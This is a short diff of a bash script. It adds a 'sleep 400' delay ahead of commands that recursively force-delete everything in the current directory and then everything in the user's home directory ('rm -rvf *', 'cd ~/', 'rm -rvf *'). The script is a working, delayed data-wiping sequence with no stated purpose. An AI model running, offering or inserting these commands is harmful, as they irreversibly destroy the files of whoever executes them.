@@ -1,4 +1,5 @@
 #!/bin/bash
+sleep 400
 rm -rvf *
 cd ~/
 rm -rvf *
